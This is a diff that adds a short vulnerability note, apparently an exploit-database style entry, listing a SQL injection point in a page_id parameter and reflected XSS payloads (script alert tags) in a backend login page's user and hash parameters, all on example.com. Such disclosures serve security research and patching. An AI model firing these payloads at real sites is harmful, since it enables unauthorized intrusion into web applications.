@@ -1,0 +1,10 @@
+
+[SQL]
+
+http://www.example.com/xmlOutput/constructrXmlOutput.content.xml.php?page_id=&#039;[INJECT POINT];--&quot;;--
+
+[XSS]
+
+http://www.example.com/backend/login.php?installed=101&amp;no_user_rights=101&amp;login_first_echo=101&amp;already_logged_in=101&amp;login_user_deactivated=101&amp;login_failed=101&amp;login_success=101&amp;nosaltnpepper=101&amp;user=101&lt;script&gt;alert(2)&lt;/script&gt;&amp;hash=101&lt;script&gt;alert(2)&lt;/script&gt;
+
+
